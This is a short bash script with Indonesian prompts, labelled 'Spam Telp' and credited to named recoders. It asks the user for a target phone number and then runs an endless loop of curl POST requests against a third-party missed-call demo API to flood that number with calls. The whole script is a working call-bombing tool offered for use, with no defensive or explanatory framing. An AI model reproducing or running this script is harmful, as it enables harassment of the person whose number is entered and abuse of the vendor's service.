#!/bin/bash
echo "#######################################"
echo "******-+-+-++[ Spam Telp ]++-+-+-******"
echo "*       Mod Recode By: M Fauzan       *"
echo "*           Code By: RoySan           *"
echo "******-+-+-+++++++++++++++++-+-+-******"
echo "#######################################"
echo "Tulis Nomer Target Disini Lalu (ENTER)"
read -p '[Example +62896123xxx]: ' nmr
while :;do curl -X POST -d "cid=$nmr&trying=0&spam_delay=10" https://www.citcall.com/demo/misscallapi.php;done
